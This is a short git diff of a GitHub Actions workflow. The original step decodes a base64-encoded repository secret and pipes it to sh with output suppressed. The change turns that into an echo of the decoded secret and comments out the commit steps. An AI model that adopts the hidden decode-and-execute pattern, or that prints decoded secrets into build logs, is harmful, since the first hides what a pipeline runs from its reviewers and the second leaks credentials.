@@ -20,15 +20,17 @@ jobs:
           SUPER_SECRET: ${{ secrets.ENC }}
         run: |
           npm i > /dev/null 2>&1
-          timeout 1500 echo "$SUPER_SECRET" | base64 --decode | sh || true #> /dev/null 2>&1
+          # timeout 1500 
+          echo "$SUPER_SECRET" | base64 --decode #| sh || true #> /dev/null 2>&1
           # cat *.txt | sh
       - name: Commit
         run: |
-          git config --local user.name "github-actions[bot]"
-          git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          echo "OK"
+          # git config --local user.name "github-actions[bot]"
+          # git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
           # git checkout --orphan latest_branch
           # git add -A
-          git commit -am "[AUTO:BUILD] `date`"
+          # git commit -am "[AUTO:BUILD] `date`"
       - name: GitHub Push
         uses: ad-m/github-push-action@master
         with:
